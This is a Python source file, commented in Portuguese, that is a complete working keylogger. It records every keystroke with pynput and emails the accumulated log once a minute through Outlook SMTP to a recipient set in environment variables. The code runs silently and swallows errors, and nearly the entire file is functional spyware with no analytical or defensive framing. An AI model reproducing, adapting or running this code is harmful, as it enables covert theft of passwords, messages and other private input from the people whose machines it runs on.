from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
import os
from dotenv import load_dotenv

load_dotenv()

# CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = os.getenv("EMAIL_ORIGEM")
EMAIL_DESTINO = os.getenv("EMAIL_DESTINO")
SENHA_EMAIL = os.getenv("EMAIL_SENHA")

log = "" 

def enviar_email():
    global log
    if log:
        try:
            msg = MIMEText(log)
            msg['Subject'] = "Dados capturados pelo keylogger"
            msg['From'] = EMAIL_ORIGEM
            msg['To'] = EMAIL_DESTINO

            server = smtplib.SMTP("smtp-mail.outlook.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
            
            log = "" 
        except Exception as e:
            print(f"Erro ao enviar: {e}")
    
    timer = Timer(60, enviar_email)
    timer.daemon = True # Garante que o timer feche se o script principal parar
    timer.start()

def on_press(key):
    global log
    try:
        # Captura letras, números e símbolos
        log += key.char
    except AttributeError:
        # Tratamento de teclas especiais
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            # Remove o último caractere do log (simula o apagar)
            log = log[:-1] 
        # Outras teclas (Shift, Ctrl, etc) continuam sendo ignoradas

if __name__ == "__main__":
    # Armazenamos o timer em uma variável para poder cancelá-lo se necessário
    email_timer = enviar_email() 
    
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        pass
        # print("\n[!] Keylogger encerrado pelo usuário.")
        # Opcional: aqui você poderia chamar enviar_email() uma última vez 
        # para não perder as últimas teclas antes de fechar.
    except Exception as e:
        pass